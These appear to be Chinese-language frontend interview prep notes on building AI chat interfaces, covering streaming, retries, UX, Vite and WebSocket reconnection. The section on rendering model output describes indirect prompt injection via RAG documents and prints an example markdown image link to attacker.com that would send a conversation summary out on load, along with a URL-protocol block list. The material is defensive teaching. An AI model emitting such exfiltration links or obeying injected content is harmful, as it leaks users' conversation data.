- **上滑解除吸底**：监听用户主动滚动（`wheel` / `touchstart` / 键盘 PageUp），一旦向上就置 false。**不能只靠 `scroll` 事件**——程序化滚动也会触发 `scroll`，会自己把自己关掉。
- **滚回底部恢复吸底**：判定回到底部区间就置 true。同时显示一个「回到最新 ↓」按钮 + 新消息计数，给用户明确的返回入口。
- **执行滚动的时机**：必须在 DOM 更新之后。Vue 用 `await nextTick()` 或 `flush: 'post'`，React 用 `useLayoutEffect`（在浏览器绘制前同步执行，避免看到跳动）。
- **流式期间用 `behavior: 'auto'` 而不是 `'smooth'`**：smooth 动画会和高频的内容增长打架，产生持续的滚动抖动和延迟感。只在用户点「回到最新」按钮时用 smooth。

 

**更省事的现代做法**：容器用 `flex-direction: column-reverse`，或者 CSS 的 `overflow-anchor` + `scroll-snap`，让浏览器帮忙维持底部锚定。但跨浏览器行为不完全一致（Safari 尤其），关键路径还是要有 JS 兜底。

 

**追问「输入法组词、图片加载完成之后高度变了，怎么保证还在底部」**：这两类都是「异步的、非内容驱动的高度变化」，靠 `scroll` 事件监听不到。解法是对滚动容器挂 `ResizeObserver`，容器内容高度变化时，如果处于吸底状态就重新滚到底。图片和 iframe 还要额外写死 `width`/`height` 或 `aspect-ratio`，从源头避免加载后重排（这同时也是 CLS 优化）。移动端还有一层：软键盘弹出会改变 `visualViewport`，要监听 `visualViewport.resize` 而不是 `window.resize`。

# 面试 01 · Vue / React / AI 前端交互 > 中断、重试、断线续传怎么做

**中断（Stop 按钮）** —— 这是 AI 应用的必备功能，因为一次生成可能要几十秒，用户看出方向不对就想停。

 

前端 `AbortController.abort()` 只是断开本地读取。三件事必须一起做：

 

1. **把已生成的部分留在界面上**，并标记为「已中断」——用户中断往往是因为已经看到想要的内容了，清掉是最糟的设计。
2. **服务端要真的停止**。前端 abort 后浏览器会关闭连接，服务端要监听连接关闭事件（Node 是 `req.on('close')` / `AbortSignal`，Spring 里是 `SseEmitter` 的 completion callback）并中断对上游模型的调用。不做这一步的后果很直接：**用户点了停止，token 还在继续烧钱**，这是面试官特别爱追的一层。
3. **落库要落已生成的部分**，并记录中断状态和实际消耗的 token，否则计费和历史记录都会对不上。

 

**重试** —— 区分两类错误，处理完全不同：

 

- **可重试**：429、5xx、连接超时、网络断开。指数退避 + 抖动（`min(base * 2^n, cap) * random(0.5, 1.5)`），尊重 `Retry-After` 头，限制最大次数（一般 2~3 次）。前端和服务端都做退避会叠乘，所以要约定好在哪一层做——通常放服务端，前端只做用户显式点「重试」。
- **不可重试**：4xx（除 429）、内容审核拒绝、上下文超长、参数错误。重试只会重复失败并浪费配额，应该直接给用户可操作的提示（「对话太长了，要不要新建会话或让我先总结一下」）。

 

**「已经流了一半才失败」是最麻烦的状态**。三个选项，向用户明示比偷偷处理好： ① 保留半截 + 提供「继续」按钮（继续要把已生成内容作为 assistant 前缀回传，让模型接着写，注意有些接口需要 prefill/continuation 支持）； ② 整条丢弃重来（幂等，但用户白等，且如果 temperature \> 0 结果会不一样）； ③ 保留半截并标注「回答未完成」。

 

**断线续传**：真正的续传需要服务端把生成过程持久化——每个 chunk 带序号写入（Redis Stream 或 append-only 存储），前端重连时带上最后收到的序号（SSE 用 `Last-Event-ID`，自定义协议就自己带 offset），服务端从该位置继续推。这是有成本的架构决策，只有「生成很长 + 移动端网络差 + 中断代价高」时才值得。绝大多数产品选择更便宜的做法：**生成结果落库 + 前端轮询/重连后拉完整结果**，用户体验是「重连后突然看到完整答案」而不是逐字续上。能讲清这个成本权衡比背出方案更重要。

 

**追问「用户刷新页面，正在生成的那条怎么办」**：这直接暴露架构选择。如果生成过程只活在那一个 HTTP 连接里，刷新就等于永久丢失，用户会很困惑（消息发出去了但没有回答）。所以生成任务应该由服务端独立驱动、结果落库，HTTP 流只是「结果的一个观察通道」——刷新后前端按会话 id 查最新状态，未完成就重新订阅，已完成就直接渲染。这和上面的断线续传、以及 `02-node-java.md` 第 16 题的长耗时请求架构，是同一个问题的三个面。

# 面试 01 · Vue / React / AI 前端交互 > 渲染模型输出，前端的安全边界在哪

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q17

**核心认知：模型输出是不可信输入，等同于用户提交的内容。** 而且它更危险——RAG 场景下，攻击者可以把恶意内容放进被检索的文档里（间接 prompt injection），模型会把它复述出来，前端再渲染。整条链路上前端是最后一道渲染防线。

# 面试 01 · Vue / React / AI 前端交互 > 渲染模型输出，前端的安全边界在哪

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q17

**XSS 面比普通业务大得多，因为要渲染富文本**：

# 面试 01 · Vue / React / AI 前端交互 > 渲染模型输出，前端的安全边界在哪

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q17（连续片段 1/2，需结合相邻段阅读）

前文：**XSS 面比普通业务大得多，因为要渲染富文本**：

1. **Markdown → HTML 必须过消毒**。`marked` / `markdown-it` 默认不做消毒（`marked` 早就移除了 `sanitize` 选项），必须接 **DOMPurify**。别自己写正则过滤——绕过方式太多（大小写、编码、畸形标签、`<svg>` / `<math>` 命名空间、mutation XSS）。
2. **绝不 `v-html` / `dangerouslySetInnerHTML` 未消毒内容**。这是最直接的洞。
3. **链接协议白名单**。`javascript:`、`data:`、`vbscript:` 全部拦掉；只放行 `http` / `https` / `mailto`。外链加 `rel="noopener noreferrer"` + `target="_blank"`（不加 `noopener` 时新页面能通过 `window.opener` 操纵原页面）。
4. **图片是数据外泄通道**。模型输出 `![](https://attacker.com/log?data=<对话摘要>)`，浏览器一加载就把数据发出去了——**不需要任何点击**。这是 AI 产品的真实漏洞类型（ChatGPT、Copilot 等都出过）。防法：图片走白名单域名或服务端代理，配 CSP `img-src`。

# 面试 01 · Vue / React / AI 前端交互 > 渲染模型输出，前端的安全边界在哪

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q17（连续片段 2/2，需结合相邻段阅读）

前文：**XSS 面比普通业务大得多，因为要渲染富文本**：

5. **CSP** 是纵深防御：`default-src 'self'`、`img-src` 白名单、`script-src` 不带 `unsafe-inline`、`frame-src 'none'`。前端框架的 inline style 需求用 nonce 或 hash 处理。
6. **代码块只展示，不执行**。要提供「运行」功能就放沙箱 iframe（`sandbox` 属性，不给 `allow-same-origin`）或服务端隔离环境。渲染 SVG 要当作可执行内容对待（SVG 里能嵌 `<script>`）。
7. **`target="_blank"` 和自动跳转都不要让模型输出控制**。禁止渲染 `<meta refresh>`、`<iframe>`、`<form>`、`<object>`。
8. **UI 欺骗**：模型输出可能伪造系统提示样式、假的输入框、假的「请输入密码」。所以**系统消息和模型消息必须有不可伪造的视觉区分**（容器样式由外层控制，模型内容永远渲染在受限容器内），敏感操作的确认弹窗不能由模型内容触发。

# 面试 01 · Vue / React / AI 前端交互 > 渲染模型输出，前端的安全边界在哪

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q17

**还要说的一层**：前端消毒不能替代服务端。API 返回给非浏览器客户端（移动端、第三方集成）时前端那层就不存在了，所以消毒和策略要在服务端也做一遍，前端这层是「渲染时的最后防线」而不是唯一防线。

# 面试 01 · Vue / React / AI 前端交互 > 渲染模型输出，前端的安全边界在哪

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q17

**追问「模型输出里带了工具调用，前端能直接执行吗」**：不能。这是 AI 应用最严重的一类设计错误。工具调用必须由服务端解析、鉴权、按当前用户的权限校验后执行——**前端拿到的只是「已执行的结果」或「需要用户确认的意图」**。让前端直接执行意味着任何人改一下响应就能越权调用任意工具。而且高危操作（删除、转账、发邮件、改配置）必须有二次确认，确认界面的内容和按钮要由前端自己的可信数据渲染，不能用模型输出的文案——否则模型可以生成一个看起来像「取消」的确认按钮。

# 面试 01 · Vue / React / AI 前端交互 > AI 功能的感知性能和不确定性 UX 怎么做

**AI 交互和传统请求的根本差别有三个**：延迟高（秒级到几十秒）、结果不确定（同样输入可能不同输出）、可能出错但看起来很自信。UX 要针对这三点设计，而不是套用普通 loading。

 

**感知性能**：

 

- **TTFT 比总时长重要得多**。用户对「1 秒开始出字、总共 20 秒」的容忍度远高于「静等 8 秒然后一次性出现」。所以工程上优先优化首 token，而不是总耗时。
- **展示中间进度而不是空转圈**。RAG 就把阶段说出来——「正在检索文档 → 找到 6 篇 → 正在生成」；Agent 就把工具调用逐步展示。用户等待时最焦虑的是不知道在等什么。这也顺带把系统变成可解释的。
- **超过 ~10 秒的等待要给可操作的出口**：停止按钮、切换到后台通知、「先给个简短版本」。
- **乐观渲染用户消息**：点发送立刻上屏，不等服务端确认。失败再标记重试。

 

**不确定性的表达**：

 

- 引用和溯源要能点开看原文，不能只标个角标。**可验证性是 AI 产品信任的基础**。
- 检索为空、置信度低就明确说「没找到依据」，而不是让模型硬编一个答案。宁可少答。
- 需要用户判断的地方给出**可编辑而非只可接受**的结果：diff 视图、逐条采纳、重新生成、调整长度/语气。
- 高风险动作（写操作、外发、花钱）一律走「模型建议 → 人确认 → 系统执行」，不要自动执行。
- 反馈通道要轻（👍/👎 + 可选原因），并且要真的回流到 eval 集——这是评估数据最廉价的来源，而且前端是唯一能采集它的地方。

 

**要避免的具体反模式**：进度条假装线性（LLM 生成时长不可预测，假进度条比转圈更伤信任）；错误信息直接把 502 或堆栈抛给用户；中断后清空已生成内容；把模型的不确定表述包装成确定语气；重新生成后原答案直接消失（应该可以切回上一版对比）。

 

**追问「你怎么衡量这些体验改动是有效的」**：前端能采到的指标要说具体——p50/p95 的 TTFT 和总时长、流式期间的长任务数与 INP、中断率（多少人点了停止，以及在第几秒点的）、重新生成率、👎 率、复制/采纳率、追问轮次。这些配合 A/B 才叫衡量。同时要承认一个边界：**体验指标和答案质量是两条线**，感知快了但答错了是负收益，所以体验改动也要跑一遍 eval 集看质量没有回退。能把「前端体验指标」和「AI 质量评估」放在一起谈，是这个岗位真正想要的复合视角。

 

## 构建与通信（第 19-21 题）

# 面试 01 · Vue / React / AI 前端交互 > 为什么 Vite 启动比 Webpack 快

**根本区别是「要不要先把整个依赖图打出来，才能给你第一个页面」。**

 

Webpack 的 dev server 也要走一遍完整构建：从 entry 开始解析全部依赖、逐个 loader 转换、组装成 bundle 放进内存，然后才响应第一个请求。项目越大这一步越长，而且与你打开哪个页面无关。

 

Vite 利用浏览器原生 ESM：dev 阶段不打包，`index.html` 里的 `script type="module"` 由浏览器自己按 import 关系去请求，Vite 只在请求到来时对**那一个文件**做转换（TS 去类型、JSX、SFC 编译）再返回。所以启动时间基本和项目规模脱钩，只和当前页面的依赖有关。

 

两个必须补的细节，只说「不打包」会被追问下去：

 

1. **依赖预打包（pre-bundling）** 是 dev 阶段唯一的打包环节，做两件事：把 CJS 的第三方包转成 ESM（`node_modules` 里大量包仍是 CJS，浏览器不认），以及把 lodash-es 那种几百个内部模块的包合成一个文件——不合的话浏览器要发几百个请求，HTTP/2 也顶不住。结果缓存在 `node_modules/.vite`，只有 lockfile 或 `optimizeDeps` 配置变了才重跑，这就是「第二次启动更快」的来源。
2. **HMR 的代价也不同**。Webpack 改一个文件要沿依赖链重建受影响的 chunk；Vite 只让那一个模块失效、浏览器重新请求它，改动成本与项目规模无关。日常开发里这块的体感差距比冷启动更大。

 

生产构建为什么还要打包：ESM 的请求瀑布在真实网络上很致命（一个模块解析完才知道下一个请谁），而 tree-shaking、chunk 划分、压缩都需要全局视野。

 

**版本口径要说准**（核实于 2026-09）：Vite 1~7 是「dev 用 esbuild + 生产用 Rollup」的双打包器架构；**Vite 8 于 2026-03-12 稳定，把两边统一成 Rust 写的 Rolldown**，Oxc 接替 esbuild 做解析/转换/压缩，CSS 压缩默认换成 Lightning CSS，依赖预打包也交给 Rolldown。官方口径是生产构建比 Rollup 快 10~30 倍（Linear 46s → 6s），配置层 `build.rollupOptions` 改名 `build.rolldownOptions`（旧名自动转换并告警）。这个变更的真正意义不是速度，是 **dev 和 prod 走同一条管道**——「dev 好用、build 挂掉」那类由 tree-shaking 差异引起的 bug 从此失去生存空间。

 

**追问「那 Vite 有什么代价，你踩过什么」**：三类现象要能说出来。**dev 与 prod 行为不一致**（Vite 8 之前最常见）：dev 不打包不做 tree-shaking，某个包的副作用在 dev 里执行了、build 后被摇掉，表现是「本地一切正常、线上白屏」。**CJS/ESM 混用**：预打包漏掉某个只在运行时才 require 的依赖，页面加载到一半才报 `does not provide an export named ...`，要手动加 `optimizeDeps.include`。**首次打开某个大页面反而慢**：请求瀑布下沉几层，这一点上 dev 体验不如已经全量打好的 Webpack，改造成懒加载路由或 `import.meta.glob` 之后要重新量一次。

# 面试 01 · Vue / React / AI 前端交互 > 你项目里的分包策略是怎么定的

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q20

多数人的答案是两条：第三方依赖打一个 vendor，每个页面各打一个 js 和 css。这两条不错，但只答这两条会被立刻追问「共用的自研组件打到哪」，那才是考点。

# 面试 01 · Vue / React / AI 前端交互 > 你项目里的分包策略是怎么定的

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q20

**分包的目标只有一个：让「会变的部分」和「不变的部分」分开缓存。** 判断标准不是「按什么分类好看」，而是「这次发版之后，用户需要重新下载多少字节」。

# 面试 01 · Vue / React / AI 前端交互 > 你项目里的分包策略是怎么定的

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q20

前文：**分包的目标只有一个：让「会变的部分」和「不变的部分」分开缓存。** 判断标准不是「按什么分类好看」，而是「这次发版之后，用户需要重新下载多少字节」。

- **一个大 vendor 的问题**：升级任意一个第三方包，整块几百 KB 的 hash 全变，用户全量重下。所以 vendor 要按「变更频率 + 体积」再切：框架层（vue / vue-router / pinia，几乎不动）、UI 库（element-plus，跟版本走）、重量级独立库（echarts、xlsx、地图 SDK，最好直接改成按需动态 `import()`，不进首屏）。
- **按路由分包是默认答案**，靠路由懒加载 `() => import('...')` 自然形成，不需要手写配置。
- **共用的自研组件打到哪** —— 这就是追问。默认行为是打包器发现它被 2 个以上 chunk 引用就自动抽成共享 chunk；但组件很小时抽出来反而多一次请求，此时应该让它内联进各自的 chunk。要人工控制就写配置：

# 面试 01 · Vue / React / AI 前端交互 > 你项目里的分包策略是怎么定的

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q20

前文：**分包的目标只有一个：让「会变的部分」和「不变的部分」分开缓存。** 判断标准不是「按什么分类好看」，而是「这次发版之后，用户需要重新下载多少字节」。

```js
// Vite 7 / Rollup
export default {
  build: {
    rollupOptions: {
      output: {
        manualChunks(id) {
          if (id.includes('node_modules/echarts')) return 'echarts'
          if (/node_modules\/(vue|vue-router|pinia)\//.test(id)) return 'framework'
        }
      }
    }
  }
}

```

# 面试 01 · Vue / React / AI 前端交互 > 你项目里的分包策略是怎么定的

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q20

前文：**分包的目标只有一个：让「会变的部分」和「不变的部分」分开缓存。** 判断标准不是「按什么分类好看」，而是「这次发版之后，用户需要重新下载多少字节」。

```js
// Vite 8（2026-03 起，Rolldown）：manualChunks 已废弃，改成声明式 advancedChunks
export default {
  build: {
    rolldownOptions: {
      output: {
        advancedChunks: {
          groups: [
            { name: 'framework', test: /node_modules[\\/](vue|vue-router|pinia)[\\/]/, priority: 20 },
            { name: 'echarts',   test: /node_modules[\\/]echarts[\\/]/, priority: 15 },
            { name: 'vendor',    test: /node_modules[\\/]/, priority: 10, maxSize: 500000 }
          ]
        }
      }
    }
  }
}

```

# 面试 01 · Vue / React / AI 前端交互 > 你项目里的分包策略是怎么定的

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q20

`advancedChunks` 比手写 `manualChunks` 多的三样正好是函数最难表达的：`priority` 决定同一模块命中多组时归谁、`maxSize`/`minSize` 让超大组自动再切、`minShareCount` 表达「被 N 个 chunk 共用才抽出来」。

# 面试 01 · Vue / React / AI 前端交互 > 你项目里的分包策略是怎么定的

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q20

**手写 manualChunks 最容易踩的坑**：把有依赖关系的模块强行分到不同 chunk，产出循环引用，表现是线上报 `Cannot access '...' before initialization`，或某个组件拿到 undefined，而本地 dev 完全正常（dev 不打包，见第 19 题）。所以任何分包改动都必须跑一次 `vite build && vite preview` 实测，不能只看产物体积。

# 面试 01 · Vue / React / AI 前端交互 > 你项目里的分包策略是怎么定的

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q20

数字这里不要编：用 `rollup-plugin-visualizer` 出图，报**你自己项目的**首屏 js 体积、chunk 数、二次发版的失效字节。

# 面试 01 · Vue / React / AI 前端交互 > 你项目里的分包策略是怎么定的

原文节选；完整上下文：https://fqx.lx.ci/interview-prep/01-frontend.html#q20

**追问「分包分完了，怎么证明有效」**：说三条可测的，别说「首屏快了」。**缓存命中**：改一行业务代码重新构建，比对两次产物文件名——只有对应页面的 chunk hash 变了才算分对，framework/vendor 的 hash 不变才是收益来源。**请求数与瀑布**：chunk 切太碎会让首屏并发请求数暴涨，HTTP/2 下也有优先级问题，Network 面板看关键路径上的请求数和最长链路。**用户指标**：LCP 与 INP（本文件第 11 题），且看分位数不看均值。还有一条反直觉的：**首屏体积不是越小越好**——把 echarts 挪出首屏、而用户一进页面就要看图表，只是把等待从白屏挪到了图表区，总时长没变。判断依据必须是真实进入路径，不是构建报告上的数字。

# 面试 01 · Vue / React / AI 前端交互 > WebSocket 断线以后你怎么重连

先说常见答法为什么不够：「断了等 10 秒重连，失败再等 10 秒，重复 3 次就放弃」。这个策略在三处会出问题，问这题就是在等这三处。

 

1. **固定间隔 + 服务端重启 = 惊群**。一台服务器挂掉，上万客户端在同一秒重连，服务端刚起来又被打死，反复循环。必须**指数退避 + 随机抖动**：`min(1000 * 2 ** n, 30000) * (0.5 + Math.random() * 0.5)`。
2. **重试 3 次就放弃太早**。用户笔记本合盖十分钟、地铁里断网，回来发现永久失联，只能刷新页面。正确做法是**退避到上限后无限重试**，但把状态显示出来（连接中 / 已断开 + 手动重连），并监听 `online` 和 `visibilitychange`——网络恢复或页面重新可见时立刻试一次，不等退避计时器。
3. **首次就等 10 秒**，用户视角是十秒钟消息发不出去。第一次重连应该几乎立即（几百毫秒），退避从第二次开始。

 

还有三件事没做就等于没重连成功：

 

- **心跳**。TCP 连接会「假活」——中间设备静默丢弃，`onclose` 永不触发。客户端定时发 ping，规定时间内没收到 pong 就主动 `close()` 走重连。心跳间隔要短于中间层的空闲超时（nginx `proxy_read_timeout`、云 LB 常见 60s）。
- **消息补偿**。断线期间的消息必须补得回来：客户端记住最后收到的消息序号或游标，重连后带上它拉增量。**少了这一步，重连成功了但内容有洞，而用户不会察觉。**
- **发送队列与幂等**。断线时用户点了发送，要么本地入队重连后重发，要么明确标红「发送失败，点击重试」。重发必须带客户端生成的消息 ID 去重，否则一条消息发两遍（`10-node.md` 第 9 题的幂等设计）。

 

服务端侧的连接管理和消息量变大后的虚拟列表问题见 `10-node.md` 第 21、22 题，这里只讲客户端。

 

**追问「你怎么测这套逻辑」**：这题的分水岭。手动拔网线测不出退避曲线和补偿逻辑，要说得出三种手段：**DevTools 的 Network 条件**切 Offline 能触发 `onclose` 与 `online` 事件；**杀掉本地 ws 服务**再按不同间隔重启，打时间戳日志看退避是否真的在拉长、上限是否生效（肉眼数不准）；**代理层注入故障**（中间放一个随机丢包或静默挂起的 ws 代理）才能测出心跳超时那条路径，因为它是唯一不触发 `onclose` 的故障模式。补偿逻辑要单独测：断开期间往服务端塞 N 条消息，重连后断言客户端拿到的正好 N 条且不重复——**真实项目里这个断言最常挂在「重复」上**，因为游标是「最后收到的」还是「下一条要收的」差一位，off-by-one 会让每次重连都多收一条。
